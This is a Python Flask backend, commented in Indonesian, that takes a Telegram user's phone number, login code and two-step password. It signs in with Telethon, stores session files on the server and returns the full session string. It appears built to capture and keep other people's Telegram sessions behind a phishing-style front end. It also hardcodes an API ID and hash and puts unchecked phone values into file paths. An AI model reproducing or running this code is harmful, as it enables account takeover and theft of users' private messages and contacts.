from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient
from telethon.sessions import StringSession
import asyncio
import os
import nest_asyncio

nest_asyncio.apply()

# Ganti sesuai milik kamu
API_ID = 28723467
API_HASH = "f51ed0208b47cfd04dc6409d64aa5bef"

SESSION_DIR = "sessions"
if not os.path.exists(SESSION_DIR):
    os.makedirs(SESSION_DIR)

app = Flask(__name__)
CORS(app)

@app.route("/")
def home():
    return "✅ Telegram Login Backend Aktif"

@app.route("/send_code", methods=["POST"])
def send_code():
    data = request.json
    phone = data.get("phone", "").strip()

    if not phone or not phone.startswith("+"):
        return jsonify({"error": "Nomor telepon tidak valid"}), 400

    async def send():
        async with TelegramClient(f"{SESSION_DIR}/{phone}", API_ID, API_HASH) as client:
            await client.connect()
            result = await client.send_code_request(phone)
            return {"status": "code_sent", "phone_code_hash": result.phone_code_hash}

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(send())
        return jsonify(result), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/verify_code", methods=["POST"])
def verify_code():
    data = request.json
    phone = data.get("phone")
    code = data.get("code")

    async def verify():
        async with TelegramClient(f"{SESSION_DIR}/{phone}", API_ID, API_HASH) as client:
            await client.sign_in(phone=phone, code=code)
            session_str = StringSession.save(client.session)
            return {"status": "logged_in", "session": session_str}

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(verify())
        return jsonify(result), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/verify_password", methods=["POST"])
def verify_password():
    data = request.json
    phone = data.get("phone")
    password = data.get("password")

    async def verify():
        async with TelegramClient(f"{SESSION_DIR}/{phone}", API_ID, API_HASH) as client:
            await client.sign_in(password=password)
            session_str = StringSession.save(client.session)
            return {"status": "logged_in", "session": session_str}

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(verify())
        return jsonify(result), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
